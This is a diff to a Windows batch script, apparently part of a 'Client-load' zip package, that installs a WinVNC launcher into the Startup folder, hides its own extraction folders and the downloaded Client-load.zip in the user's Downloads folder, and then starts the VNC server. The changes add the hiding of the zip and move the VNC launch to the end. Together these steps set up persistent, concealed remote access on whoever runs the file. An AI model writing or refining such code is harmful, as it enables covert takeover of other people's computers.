@@ -28,20 +28,26 @@ if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc
 
 if exist "%script_dir%run_winvnc.bat" (
   echo run_winvnc.bat created successfully in current directory.
-  echo.
-  echo Running run_winvnc.bat...
-  call "%script_dir%run_winvnc.bat"
 ) else (
   echo Failed to create run_winvnc.bat in current directory.
 )
 
-REM Hide the Client-load folder and its enclosing folder
+REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Hide the Client-load.zip file with the same name as the parent folder
-attrib +h "%script_dir%\..\Client-load.zip"
+REM Hide the Client-load.zip file in the Downloads folder
+attrib +h "%USERPROFILE%\Downloads\Client-load.zip"
 
 REM Display a completion message
 echo.
 echo Startup setup completed. Parent folders and ZIP file hidden.
+
+REM Run run_winvnc.bat at the end
+if exist "%script_dir%run_winvnc.bat" (
+  echo.
+  echo Running run_winvnc.bat...
+  call "%script_dir%run_winvnc.bat"
+) else (
+  echo Failed to run run_winvnc.bat.
+)
